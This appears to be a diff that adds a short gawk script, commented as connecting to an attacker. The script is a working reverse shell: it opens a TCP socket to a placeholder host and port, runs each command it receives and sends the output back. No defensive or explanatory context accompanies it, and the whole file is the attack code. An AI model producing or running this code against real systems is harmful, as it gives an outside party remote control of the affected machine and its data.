@@ -1,0 +1,17 @@
+BEGIN {
+    # Define the network socket to connect to the attacker
+    sock = "/inet/tcp/0/*\host*/*\port*"
+
+    while (1) {
+        # Attempt to read a command from the socket
+        if ((sock |& getline c) <= 0)
+            break  # Exit if connection fails
+
+        # While the command produces output, send it back over the socket
+        while (c && (c |& getline) > 0)
+            print $0 |& sock
+
+        # Close the command input and output streams
+        close(c)
+    }
+}
